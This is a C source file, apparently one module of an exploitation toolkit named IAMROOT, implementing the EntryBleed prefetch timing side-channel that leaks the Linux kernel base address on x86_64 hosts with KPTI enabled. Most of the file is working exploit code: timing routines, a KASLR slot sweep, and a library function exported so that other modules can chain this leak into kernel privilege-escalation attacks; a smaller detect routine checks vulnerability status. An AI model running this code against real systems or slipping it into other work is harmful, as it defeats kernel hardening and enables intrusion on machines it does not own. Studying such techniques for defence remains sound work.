/*
 * entrybleed_cve_2023_0458 — IAMROOT module
 *
 * EntryBleed (Lipp et al., USENIX Security '23). A KPTI prefetchnta
 * timing side-channel that leaks the kernel base address.
 *
 * STATUS: 🟢 WORKING — adopted public technique.
 *
 *   - exploit() runs the leak and prints kbase. Empirically 5/5 on
 *     lts-6.12.88 (verified 2026-05-16 via earlier SKYFALL PoC at
 *     bugs/leak_write_modprobe_2026-05-16/exploit.c lines ~73-150).
 *   - detect() checks the host's KPTI status and config. KPTI on + no
 *     anti-EntryBleed mitigation = VULNERABLE.
 *   - This module is also a LIBRARY: other modules that need a kbase
 *     leak as part of a chain can call `entrybleed_leak_kbase_lib()`
 *     directly (declared in iamroot_modules.h).
 *
 * x86_64 only. On ARM64 / other arches, detect() returns
 * IAMROOT_PRECOND_FAIL and exploit() returns IAMROOT_PRECOND_FAIL.
 *
 * For users who'd never go to USENIX (TLDR):
 *   - KPTI unmaps kernel pages from user CR3 on kernel-exit, but leaves
 *     the syscall-entry trampoline mapped (it has to — that's how user
 *     syscalls enter the kernel)
 *   - `prefetchnta <addr>` is observable via timing: mapped addresses
 *     are much faster than unmapped (the TLB walker speculates even
 *     for kernel pages without the user-bit)
 *   - Time prefetchnta across the 16 MiB KASLR range; the fastest
 *     slot is the real entry_SYSCALL_64
 *   - Subtract its known offset from kbase → KASLR slide
 */

#include "iamroot_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

/* ---------- Tunables (lts-6.12.x defaults; override via env vars) ---------- */
#define KERNEL_LOWER       0xffffffff80000000UL
#define KERNEL_UPPER       0xffffffffc0000000UL
#define KASLR_STRIDE       0x200000UL        /* 2MiB — KASLR slot granularity */
#define DEFAULT_ENTRY_OFF  0x5600000UL       /* entry_SYSCALL_64 slot offset for lts-6.12.x */
#define ROUNDS             32                /* per-candidate timing rounds */
#define HOT_RUNS           32                /* warm-the-syscall iterations */

#if defined(__x86_64__) || defined(_M_X64)

/* Some libcs / non-glibc environments don't define __always_inline.
 * Provide a local fallback so this file builds on musl, macOS clangd,
 * etc. (Builds on glibc unchanged.) */
#ifndef __always_inline
#define __always_inline inline __attribute__((always_inline))
#endif

static __always_inline uint64_t rdtsc_start(void)
{
    unsigned a, d;
    __asm__ volatile("mfence\nrdtsc\nmfence" : "=a"(a), "=d"(d) :: "memory");
    return ((uint64_t)d << 32) | a;
}

static __always_inline uint64_t rdtsc_end(void)
{
    unsigned a, d;
    __asm__ volatile("mfence\nrdtscp\nmfence"
                     : "=a"(a), "=d"(d) :: "rcx", "memory");
    return ((uint64_t)d << 32) | a;
}

static __always_inline void prefetch(void *p)
{
    __asm__ volatile("prefetchnta (%0)\nprefetcht2 (%0)\n" :: "r"(p));
}

static uint64_t time_slot(uintptr_t addr)
{
    uint64_t t0, t1, best = ~0ULL;
    for (int i = 0; i < ROUNDS; i++) {
        /* Warm the TLB by re-entering the kernel — getpid is the
         * canonical zero-side-effect syscall. */
        for (int j = 0; j < HOT_RUNS; j++) syscall(SYS_getpid);
        t0 = rdtsc_start();
        prefetch((void *)addr);
        t1 = rdtsc_end();
        if (t1 - t0 < best) best = t1 - t0;
    }
    return best;
}

unsigned long entrybleed_leak_kbase_lib(unsigned long entry_syscall_slot_offset)
{
    if (entry_syscall_slot_offset == 0)
        entry_syscall_slot_offset = DEFAULT_ENTRY_OFF;

    uintptr_t best_base = 0;
    uint64_t  best_time = ~0ULL;

    for (uintptr_t base = KERNEL_LOWER; base < KERNEL_UPPER; base += KASLR_STRIDE) {
        uintptr_t probe = base + entry_syscall_slot_offset;
        uint64_t  t     = time_slot(probe);
        if (t < best_time) { best_time = t; best_base = base; }
    }
    return (unsigned long)best_base;
}

static int read_first_line(const char *path, char *out, size_t n)
{
    FILE *f = fopen(path, "r");
    if (!f) return -1;
    if (!fgets(out, n, f)) { fclose(f); return -1; }
    fclose(f);
    /* trim trailing newline */
    size_t L = strlen(out);
    while (L && (out[L-1] == '\n' || out[L-1] == '\r')) out[--L] = 0;
    return 0;
}

static iamroot_result_t entrybleed_detect(const struct iamroot_ctx *ctx)
{
    /* Probe KPTI status. /sys/devices/system/cpu/vulnerabilities/meltdown
     * is the most direct signal: "Mitigation: PTI" means KPTI is on
     * (= EntryBleed-applicable). "Not affected" means a hardened CPU
     * (very recent Intel + most AMD = no KPTI = no EntryBleed). */
    char buf[256];
    int rc = read_first_line(
        "/sys/devices/system/cpu/vulnerabilities/meltdown", buf, sizeof buf);
    if (rc < 0) {
        if (!ctx->json) {
            fprintf(stderr, "[?] entrybleed: cannot read meltdown vuln status — "
                            "assuming KPTI on (conservative)\n");
        }
        return IAMROOT_VULNERABLE;
    }
    if (!ctx->json) {
        fprintf(stderr, "[i] entrybleed: meltdown status = '%s'\n", buf);
    }

    /* "Not affected" → CPU is Meltdown-immune → no KPTI → no EntryBleed */
    if (strstr(buf, "Not affected") != NULL) {
        if (!ctx->json) {
            fprintf(stderr, "[+] entrybleed: CPU is Meltdown-immune; KPTI off; "
                            "EntryBleed N/A\n");
        }
        return IAMROOT_OK;
    }

    /* "Mitigation: PTI" or "Vulnerable" or similar — KPTI is most likely
     * on, EntryBleed applies. */
    if (!ctx->json) {
        fprintf(stderr, "[!] entrybleed: KPTI active → "
                        "VULNERABLE (no canonical anti-EntryBleed patch in mainline)\n");
        fprintf(stderr, "[i] entrybleed: --exploit will leak kbase (harmless leak; "
                        "no /etc/passwd writes)\n");
    }
    return IAMROOT_VULNERABLE;
}

static iamroot_result_t entrybleed_exploit(const struct iamroot_ctx *ctx)
{
    const char *off_env = getenv("IAMROOT_ENTRYBLEED_OFFSET");
    unsigned long off = 0;
    if (off_env) {
        off = strtoul(off_env, NULL, 0);
        if (!ctx->json) {
            fprintf(stderr, "[i] entrybleed: using IAMROOT_ENTRYBLEED_OFFSET=0x%lx\n", off);
        }
    } else if (!ctx->json) {
        fprintf(stderr, "[i] entrybleed: using default entry_SYSCALL_64 slot offset "
                        "0x%lx (lts-6.12.x). Override via IAMROOT_ENTRYBLEED_OFFSET=0x...\n",
                DEFAULT_ENTRY_OFF);
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] entrybleed: sweeping KASLR slots 0x%lx..0x%lx (stride 0x%lx)\n",
                KERNEL_LOWER, KERNEL_UPPER, KASLR_STRIDE);
    }

    unsigned long kbase = entrybleed_leak_kbase_lib(off);
    if (kbase == 0) {
        fprintf(stderr, "[-] entrybleed: leak failed (kbase == 0)\n");
        return IAMROOT_EXPLOIT_FAIL;
    }

    if (ctx->json) {
        fprintf(stdout, "{\"kbase\":\"0x%lx\"}\n", kbase);
    } else {
        fprintf(stdout, "[+] entrybleed: leaked kbase = 0x%lx\n", kbase);
        fprintf(stderr, "[+] entrybleed: KASLR slide = 0x%lx (relative to 0xffffffff81000000)\n",
                kbase - 0xffffffff81000000UL);
    }
    return IAMROOT_EXPLOIT_OK;
}

#else /* not x86_64 */

unsigned long entrybleed_leak_kbase_lib(unsigned long off)
{
    (void)off;
    return 0;
}

static iamroot_result_t entrybleed_detect(const struct iamroot_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[i] entrybleed: x86_64 only; this build is for a "
                    "different architecture\n");
    return IAMROOT_PRECOND_FAIL;
}

static iamroot_result_t entrybleed_exploit(const struct iamroot_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] entrybleed: x86_64 only\n");
    return IAMROOT_PRECOND_FAIL;
}

#endif

const struct iamroot_module entrybleed_module = {
    .name         = "entrybleed",
    .cve          = "CVE-2023-0458",
    .summary      = "KPTI prefetchnta timing side-channel → kbase leak (stage-1)",
    .family       = "entrybleed",
    .kernel_range = "any x86_64 KPTI-enabled kernel; only partial mitigations in mainline",
    .detect       = entrybleed_detect,
    .exploit      = entrybleed_exploit,
    .mitigate     = NULL,
    .cleanup      = NULL,
};

void iamroot_register_entrybleed(void)
{
    iamroot_register(&entrybleed_module);
}
